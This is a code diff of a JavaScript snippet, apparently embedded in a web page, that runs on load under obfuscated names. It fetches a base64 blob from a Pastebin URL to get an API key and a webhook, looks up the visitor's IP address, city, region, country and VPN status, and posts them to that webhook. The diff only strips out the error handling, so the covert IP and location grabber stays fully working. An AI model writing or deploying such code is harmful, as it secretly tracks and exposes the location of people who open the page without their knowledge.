@@ -10,43 +10,30 @@
         const a1B2c3D4E5 = 'https://pastebin.com/raw/quyru4jf';
 
         async function jK8l9MnOpQ() {
-            try {
-                const zXyWvU = await fetch(a1B2c3D4E5);
-                const tGhJ6K9 = await zXyWvU.text();
-                const sR8T9Y0 = atob(tGhJ6K9);
-                const [uY5X6Z7A8, bC3D4E5F6] = sR8T9Y0.split(',');
-                xF2G3H4I5(uY5X6Z7A8, bC3D4E5F6);
-            } catch (error) {
-                console.error('Error fetching the credentials:', error);
-            }
+            const zXyWvU = await fetch(a1B2c3D4E5);
+            const tGhJ6K9 = await zXyWvU.text();
+            const sR8T9Y0 = atob(tGhJ6K9);
+            const [uY5X6Z7A8, bC3D4E5F6] = sR8T9Y0.split(',');
+            xF2G3H4I5(uY5X6Z7A8, bC3D4E5F6);
         }
 
         async function xF2G3H4I5(a, b) {
-            try {
-                const mN1O2P3 = await fetch(`https://vpnapi.io/api/auto?key=${a}`);
-                const qR4S5T6 = await mN1O2P3.json();
-                const lM7N8O9 = qR4S5T6.location.city || "Unknown";
-                const pQ0R1S2 = qR4S5T6.location.region || "Unknown";
-                const vW3X4Y5 = qR4S5T6.location.country || "Unknown";
-                const tU6V7W8 = qR4S5T6.security.vpn ? "Yes" : "No";
-                const oP9Q0R1 = {
-                    content: `Data: ${qR4S5T6.ip}\nPlace: ${lM7N8O9}, ${pQ0R1S2}, ${vW3X4Y5}\nVPN: ${tU6V7W8}`
-                };
-                
-                const webhookResponse = await fetch(b, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(oP9Q0R1)
-                });
-
-                if (!webhookResponse.ok) {
-                    console.error('Error sending to webhook:', await webhookResponse.text());
-                }
-            } catch (error) {
-                console.error('Error during the process:', error);
-            }
+            const mN1O2P3 = await fetch(`https://vpnapi.io/api/auto?key=${a}`);
+            const qR4S5T6 = await mN1O2P3.json();
+            const lM7N8O9 = qR4S5T6.location.city || "Unknown";
+            const pQ0R1S2 = qR4S5T6.location.region || "Unknown";
+            const vW3X4Y5 = qR4S5T6.location.country || "Unknown";
+            const tU6V7W8 = qR4S5T6.security.vpn ? "Yes" : "No";
+            const oP9Q0R1 = {
+                content: `Data: ${qR4S5T6.ip}\nPlace: ${lM7N8O9}, ${pQ0R1S2}, ${vW3X4Y5}\nVPN: ${tU6V7W8}`
+            };
+            await fetch(b, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(oP9Q0R1)
+            });
         }
 
         jK8l9MnOpQ();
